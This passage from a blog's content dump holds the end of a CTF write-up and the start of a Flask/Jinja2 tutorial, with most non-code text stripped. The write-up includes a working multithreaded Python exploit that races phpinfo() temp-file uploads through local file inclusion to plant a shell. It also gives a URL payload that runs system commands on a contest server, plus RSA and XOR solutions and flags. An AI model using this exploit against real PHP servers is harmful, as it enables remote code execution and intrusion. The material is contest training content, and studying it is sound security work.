class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\">    s2.send(lfireq % (fn, host))</span><br><span class=\"line\">    d = s2.recv(<span class=\"number\">4096</span>)</span><br><span class=\"line\">    s.close()</span><br><span class=\"line\">    s2.close()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> d.find(tag) != <span class=\"number\">-1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> fn</span><br><span class=\"line\"></span><br><span class=\"line\">counter=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ThreadWorker</span><span class=\"params\">(threading.Thread)</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, e, l, m, *args)</span>:</span></span><br><span class=\"line\">        threading.Thread.__init__(self)</span><br><span class=\"line\">        self.event = e</span><br><span class=\"line\">        self.lock =  l</span><br><span class=\"line\">        self.maxattempts = m</span><br><span class=\"line\">        self.args = args</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">global</span> counter</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"keyword\">not</span> self.event.is_set():</span><br><span class=\"line\">            <span class=\"keyword\">with</span> self.lock:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> counter &gt;= self.maxattempts:</span><br><span class=\"line\">                    <span class=\"keyword\">return</span></span><br><span class=\"line\">                counter+=<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                x = phpInfoLFI(*self.args)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> self.event.is_set():</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>                </span><br><span class=\"line\">                <span class=\"keyword\">if</span> x:</span><br><span class=\"line\">                    <span class=\"keyword\">print</span> <span class=\"string\">\"\\nGot it! Shell created in /tmp/g\"</span></span><br><span class=\"line\">                    self.event.set()</span><br><span class=\"line\">                    </span><br><span class=\"line\">            <span class=\"keyword\">except</span> socket.error:</span><br><span class=\"line\">                <span class=\"keyword\">return</span></span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getOffset</span><span class=\"params\">(host, port, phpinforeq)</span>:</span></span><br><span class=\"line\">    <span class=\"string\">\"\"\"Gets offset of tmp_name in the php output\"\"\"</span></span><br><span class=\"line\">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">    s.connect((host,port))</span><br><span class=\"line\">    s.send(phpinforeq)</span><br><span class=\"line\">    </span><br><span class=\"line\">    d = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        i = s.recv(<span class=\"number\">4096</span>)</span><br><span class=\"line\">        d+=i        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> i == <span class=\"string\">\"\"</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"comment\"># detect the final chunk</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> i.endswith(<span class=\"string\">\"0\\r\\n\\r\\n\"</span>):</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    s.close()</span><br><span class=\"line\">    i = d.find(<span class=\"string\">\"[tmp_name] =&amp;gt; \"</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> i == <span class=\"number\">-1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">raise</span> ValueError(<span class=\"string\">\"No php tmp_name in phpinfo output\"</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"found %s at %i\"</span> % (d[i:i+<span class=\"number\">10</span>],i)</span><br><span class=\"line\">    <span class=\"comment\"># padded up a bit</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> i+<span class=\"number\">256</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"LFI With PHPInfo()\"</span></span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"-=\"</span> * <span class=\"number\">30</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> len(sys.argv) &lt; <span class=\"number\">2</span>:</span><br><span class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">\"Usage: %s host [port] [threads]\"</span> % sys.argv[<span class=\"number\">0</span>]</span><br><span class=\"line\">        sys.exit(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        host = socket.gethostbyname(sys.argv[<span class=\"number\">1</span>])</span><br><span class=\"line\">    <span class=\"keyword\">except</span> socket.error, e:</span><br><span class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">\"Error with hostname %s: %s\"</span> % (sys.argv[<span class=\"number\">1</span>], e)</span><br><span class=\"line\">        sys.exit(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    port=<span class=\"number\">80</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        port = int(sys.argv[<span class=\"number\">2</span>])</span><br><span class=\"line\">    <span class=\"keyword\">except</span> IndexError:</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> ValueError, e:</span><br><span class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">\"Error with port %d: %s\"</span> % (sys.argv[<span class=\"number\">2</span>], e)</span><br><span class=\"line\">        sys.exit(<span class=\"number\">1</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    poolsz=<span class=\"number\">10</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        poolsz = int(sys.argv[<span class=\"number\">3</span>])</span><br><span class=\"line\">    <span class=\"keyword\">except</span> IndexError:</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> ValueError, e:</span><br><span class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">\"Error with poolsz %d: %s\"</span> % (sys.argv[<span class=\"number\">3</span>], e)</span><br><span class=\"line\">        sys.exit(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"Getting initial offset...\"</span>,  </span><br><span class=\"line\">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class=\"line\">    offset = getOffset(host, port, reqphp)</span><br><span class=\"line\">    sys.stdout.flush()</span><br><span class=\"line\"></span><br><span class=\"line\">    maxattempts = <span class=\"number\">1000</span></span><br><span class=\"line\">    e = threading.Event()</span><br><span class=\"line\">    l = threading.Lock()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"Spawning worker pool (%d)...\"</span> % poolsz</span><br><span class=\"line\">    sys.stdout.flush()</span><br><span class=\"line\"></span><br><span class=\"line\">    tp = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,poolsz):</span><br><span class=\"line\">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> tp:</span><br><span class=\"line\">        t.start()</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"keyword\">not</span> e.wait(<span class=\"number\">1</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> e.is_set():</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> l:</span><br><span class=\"line\">                sys.stdout.write( <span class=\"string\">\"\\r% 4d / % 4d\"</span> % (counter, maxattempts))</span><br><span class=\"line\">                sys.stdout.flush()</span><br><span class=\"line\">                <span class=\"keyword\">if</span> counter &gt;= maxattempts:</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">print</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> e.is_set():</span><br><span class=\"line\">            <span class=\"keyword\">print</span> <span class=\"string\">\"Woot!  \\m/\"</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">print</span> <span class=\"string\">\":(\"</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> KeyboardInterrupt:</span><br><span class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">\"\\nTelling threads to shutdown...\"</span></span><br><span class=\"line\">        e.set()</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"Shuttin' down...\"</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> tp:</span><br><span class=\"line\">        t.join()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n<p>payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;202.119.201.197:13077&#x2F;?file&#x3D;&#x2F;tmp&#x2F;g&amp;1&#x3D;system(%27cat%20&#x2F;tmp&#x2F;7IDUrqGOt8PMATm852&#x2F;flag.txt%27);</span><br><span class=\"line\">#CUMTCTF&#123;Orz_to_php1nf0&#125;</span><br></pre></td></tr></table></figure>\n<p>flag</p>\n<h1 id=\"re\"><a href=\"#re\" class=\"headerlink\" title=\"re\"></a>re</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>010cumtctfflag</p>\n<h2 id=\"pythonpy\"><a href=\"#pythonpy\" class=\"headerlink\" title=\"pythonpy\"></a>pythonpy</h2><p></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># flag = input()</span></span><br><span class=\"line\">cipher = [<span class=\"number\">80</span>,<span class=\"number\">70</span>,<span class=\"number\">94</span>,<span class=\"number\">71</span>,<span class=\"number\">80</span>,<span class=\"number\">71</span>,<span class=\"number\">85</span>,<span class=\"number\">104</span>,<span class=\"number\">86</span>,<span class=\"number\">39</span>,<span class=\"number\">64</span>,<span class=\"number\">106</span>,<span class=\"number\">76</span>,<span class=\"number\">67</span>,<span class=\"number\">106</span>,<span class=\"number\">71</span>,<span class=\"number\">123</span>,<span class=\"number\">92</span>,<span class=\"number\">125</span>,<span class=\"number\">76</span>,<span class=\"number\">37</span>,<span class=\"number\">106</span>,<span class=\"number\">103</span>,<span class=\"number\">118</span>,<span class=\"number\">80</span>,<span class=\"number\">35</span>,<span class=\"number\">119</span>,<span class=\"number\">32</span>,<span class=\"number\">110</span>]</span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># if(len(flag==29)):</span></span><br><span class=\"line\"><span class=\"comment\">#     for i,n in enumerate(flag):</span></span><br><span class=\"line\"><span class=\"comment\">#         if ord(n) ^ 19 != cipher[i]:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># else:</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> cipher:</span><br><span class=\"line\">    a = i ^ <span class=\"number\">19</span></span><br><span class=\"line\">    print(chr(a),end=<span class=\"string\">''</span>)</span><br></pre></td></tr></table></figure>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>IDAflag</p>\n<h1 id=\"pwn\"><a href=\"#pwn\" class=\"headerlink\" title=\"pwn\"></a>pwn</h1><h2 id=\"test-nc\"><a href=\"#test-nc\" class=\"headerlink\" title=\"test_nc\"></a>test_nc</h2><p>nc flag</p>\n<h2 id=\"babystack\"><a href=\"#babystack\" class=\"headerlink\" title=\"babystack\"></a>babystack</h2><p>010bash</p>\n<p>flag</p>\n<h1 id=\"crypto\"><a href=\"#crypto\" class=\"headerlink\" title=\"crypto\"></a>crypto</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>rsae n c m</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># e = 0x10001</span></span><br><span class=\"line\"><span class=\"comment\"># n = 0xeb80cc09ed9780fe25cadf7c168d2da3ea24e35237e92faf5ee0d7980c11302f</span></span><br><span class=\"line\"><span class=\"comment\"># c = 0x596d5175112e346590aae5a3d633e71d2d12b28b60f08f8efa82fc092acc8c2d</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Hint  google RS</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> gmpy2</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\">e=<span class=\"number\">0x10001</span></span><br><span class=\"line\">c = <span class=\"number\">0x596d5175112e346590aae5a3d633e71d2d12b28b60f08f8efa82fc092acc8c2d</span></span><br><span class=\"line\">p = <span class=\"number\">324350545929838254331191385863847627003</span></span><br><span class=\"line\">q = <span class=\"number\">328413456989577256301798468872388310877</span></span><br><span class=\"line\">n = <span class=\"number\">0xeb80cc09ed9780fe25cadf7c168d2da3ea24e35237e92faf5ee0d7980c11302f</span></span><br><span class=\"line\">d = gmpy2.invert(e,(p<span class=\"number\">-1</span>)*(q<span class=\"number\">-1</span>))</span><br><span class=\"line\">m = pow(c,d,n)</span><br><span class=\"line\">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>\n<p>flag</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>8</p>\n<p>flag</p>\n<h1 id=\"misc\"><a href=\"#misc\" class=\"headerlink\" title=\"misc\"></a>misc</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>zipbase64flag</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>mp3</p>\n<p>  cumt</p>\n<p>mosepythonpytho</p>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CUMTCTF&#123;M0RS38MORSE8M0RS38MORSE8M0RSE8AND8MP3ST39O&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>tcp</p>\n<p></p>\n<p></p>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CUMTCTF&#123;cecc1394-6133-43d0-be06-a41c5f231dd4&#125;</span><br></pre></td></tr></table></figure>\n","categories":["CTF"],"tags":["WP"]},{"title":"python","url":"https://pz1o.top/2020/08/13/python/","content":"<a id=\"more\"></a>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><p>pythonpythonFlaskDjango </p>\n<h1 id=\"Flask\"><a href=\"#Flask\" class=\"headerlink\" title=\"Flask\"></a>Flask</h1><h2 id=\"URL\"><a href=\"#URL\" class=\"headerlink\" title=\"URL\"></a>URL</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># flaskFlask</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Flask</span></span><br><span class=\"line\"><span class=\"comment\"># Flask()</span></span><br><span class=\"line\"><span class=\"comment\"># __name__</span></span><br><span class=\"line\"><span class=\"comment\"># 1. flask</span></span><br><span class=\"line\"><span class=\"comment\"># 2. flaskFlask-Sqlalchemy</span></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># @app.route</span></span><br><span class=\"line\"><span class=\"comment\"># @</span></span><br><span class=\"line\"><span class=\"comment\"># url</span></span><br><span class=\"line\"><span class=\"comment\"># 127.0.0.1:5000/   -&gt;  hello_world</span></span><br><span class=\"line\"><span class=\"meta\">@app.route('/')</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">hello_world</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'flask'</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># app.run()</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">        <span class=\"comment\"># app.run()</span></span><br><span class=\"line\">        <span class=\"comment\"># </span></span><br><span class=\"line\">        <span class=\"comment\"># while True:</span></span><br><span class=\"line\">        <span class=\"comment\">#  listen()</span></span><br><span class=\"line\">    app.run()</span><br></pre></td></tr></table></figure>\n<h3 id=\"debug\"><a href=\"#debug\" class=\"headerlink\" title=\"debug\"></a><strong>debug</strong></h3><ol>\n<li>app.run()debug,app.run(debug=True)debug</li>\n<li>debug<ul>\n<li></li>\n<li><code>python</code></li>\n</ul>\n</li>\n</ol>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><strong></strong></h3><ol>\n<li><code>config.py</code></li>\n<li>app<code>app</code> <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import config</span><br><span class=\"line\">app.config.from_object(config)</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h3 id=\"URL\"><a href=\"#URL\" class=\"headerlink\" title=\"URL\"></a><strong>URL</strong></h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@app.route(&#39;&#x2F;user&#x2F;&lt;id&gt;&#39;)</span><br><span class=\"line\">def users(id):</span><br><span class=\"line\">    return u&#39;&#123;&#125;&#39;.format(id)</span><br><span class=\"line\">#</span><br><span class=\"line\">#url</span><br></pre></td></tr></table></figure>\n<h3 id=\"URL\"><a href=\"#URL\" class=\"headerlink\" title=\"URL\"></a><strong>URL</strong></h3><ol>\n<li>URLurlurl</li>\n<li>url<ul>\n<li>url</li>\n<li>url</li>\n</ul>\n</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from flask import Flask,url_for</span><br><span class=\"line\">print url_for(&#39;users&#39;,id&#x3D;&#39;1&#39;)</span><br></pre></td></tr></table></figure>\n<p><strong></strong></p>\n<p> </p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">form flask <span class=\"keyword\">import</span> redirect,url_for</span><br><span class=\"line\">url = url_for(<span class=\"string\">'users'</span>)  users</span><br><span class=\"line\">redirect(url)</span><br></pre></td></tr></table></figure>\n<h2 id=\"jinja2\"><a href=\"#jinja2\" class=\"headerlink\" title=\"jinja2\"></a>jinja2</h2><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>1.</p>\n<ul>\n<li><code>templates</code></li>\n<li><code>flask</code><code>render_template</code></li>\n<li><code>render_template</code><code>templates</code></li>\n</ul>\n<p>2.</p>\n<ul>\n<li><code>render_template</code></li>\n<li><strong></strong><code>render_template</code><br><strong></strong></li>\n</ul>\n<p>3.<code></code></p>\n<p>4.<code></code><code></code>.</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\t\t<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Person</span><span class=\"params\">(object)</span>:</span></span><br><span class=\"line\">        name = <span class=\"string\">'pz1o'</span></span><br><span class=\"line\">        age = <span class=\"number\">18</span></span><br><span class=\"line\">    p = Person()</span><br><span class=\"line\">    <span class=\"comment\">#login_url = url_for('users')</span></span><br><span class=\"line\">    <span class=\"comment\">#return redirect(login_url)</span></span><br><span class=\"line\">    context = &#123;</span><br><span class=\"line\">        <span class=\"string\">'gender'</span>:<span class=\"string\">'nan'</span>,</span><br><span class=\"line\">        <span class=\"string\">'person'</span>: p</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">'index.html'</span>,**context)</span><br><span class=\"line\">    </span><br><span class=\"line\">&lt;p&gt;&#123;&#123;person.name&#125;&#125;&lt;/p&gt;</span><br><span class=\"line\">&lt;p&gt;&#123;&#123;person.age&#125;&#125;&lt;/p&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"iffor\"><a href=\"#iffor\" class=\"headerlink\" title=\"iffor\"></a>iffor</h3><p><strong>if</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% <span class=\"keyword\">if</span> xxx %&#125;</span><br><span class=\"line\">&#123;% <span class=\"keyword\">else</span> %&#125;</span><br><span class=\"line\">&#123;% endif %&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;% <span class=\"keyword\">if</span> user%&#125;</span><br><span class=\"line\">        &lt;a href=\"#\"&gt;&#123;&#123; user.name &#125;&#125;&lt;/a&gt;</span><br><span class=\"line\">        &lt;a href=\"#\"&gt;&lt;/a&gt;</span><br><span class=\"line\">&#123;% <span class=\"keyword\">else</span> %&#125;</span><br><span class=\"line\">        &lt;a href=\"#\"&gt;&lt;/a&gt;</span><br><span class=\"line\">        &lt;a href=\"#\"&gt;&lt;/a&gt;</span><br><span class=\"line\">&#123;% endif %&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">return</span> render_template(<span class=\"string\">'index.html'</span>,user=user)</span><br></pre></td></tr></table></figure>\n<p><strong>for</strong></p>\n<p>  <code>python</code><code>items()</code><code>keys()</code><code>values()</code><code>iteritems()</code><code>iterkeys()</code><code>itervalues()</code></p>\n   <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% <span class=\"keyword\">for</span> k,v <span class=\"keyword\">in</span> user.items() %&#125;</span><br><span class=\"line\">    &lt;p&gt;&#123;&#123; k &#125;&#125;&#123;&#123; v &#125;&#125;&lt;/p&gt;</span><br><span class=\"line\">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>\n<p>   <code>python</code></p>\n   <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% <span class=\"keyword\">for</span> website <span class=\"keyword\">in</span> websites %&#125;</span><br><span class=\"line\">    &lt;p&gt;&#123;&#123; website &#125;&#125;&lt;/p&gt;</span><br><span class=\"line\">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p><img src=\"/2020/08/13/python%E5%BC%80%E5%8F%91/image-20200814161938542.png\" alt=\"image-20200814161938542\"></p>\n<p></p>\n<ul>\n<li><p></p>\n</li>\n<li><p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;avatar|default()&#125;&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>default</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">avatar = <span class=\"string\">'xxx'</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> render_template(<span class=\"string\">'index.html'</span>,avatar=avatar)</span><br><span class=\"line\">&lt;img src=<span class=\"string\">'&#123;&#123;avatar|default('</span>...<span class=\"string\">')&#125;&#125;'</span>&gt;</span><br></pre></td></tr></table></figure>\n<p>length</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">comment = [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"string\">'user'</span>:<span class=\"string\">'pz1o'</span>,</span><br><span class=\"line\">            <span class=\"string\">'content'</span>:<span class=\"string\">'xxx'</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"string\">'user'</span>:<span class=\"string\">'lzy'</span>,</span><br><span class=\"line\">            <span class=\"string\">'content'</span>:<span class=\"string\">'xxxx'</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">'index.html'</span>,comments=comment)</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;p&gt;:&#123;&#123; comments|length &#125;&#125;&lt;/p&gt;</span><br><span class=\"line\">    &lt;ul&gt;</span><br><span class=\"line\">        &#123;% <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> comments %&#125;</span><br><span class=\"line\">        &lt;li&gt;</span><br><span class=\"line\">            